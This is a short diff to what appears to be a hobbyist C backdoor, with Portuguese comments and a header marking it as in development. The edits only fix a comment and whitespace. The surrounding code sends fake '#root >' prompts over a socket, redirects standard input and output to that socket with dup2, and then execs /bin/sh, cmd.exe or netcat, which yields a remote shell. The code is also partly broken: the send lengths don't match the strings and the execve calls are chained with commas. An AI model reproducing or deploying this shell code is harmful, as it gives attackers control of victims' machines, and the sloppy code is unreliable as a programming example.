@@ -124,7 +124,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   }
 
 
-  /*função para o programa rodar em background, como um deamon
+  /*função para o programa rodar em background, como uma daemon
 
 
    create connection */
@@ -200,13 +200,17 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      sleep(5); /* sleep for 5 sec */
 
      /*enter in a shell, finally */
+		
+    /* fck, anyway, here are where the conditions come. */ 		
 
      send(x,"\nsocket created\n",18,0), send(x,"\nConnected in machine\n",22,0);
      if(connect == -1)
      perror("BREAK CONNECTION,(failure)");
-     else
+     else 
+	     
      send(x,"\n#root > /n",7,0);
      fflush(stdout);
+     
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
      root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);
 
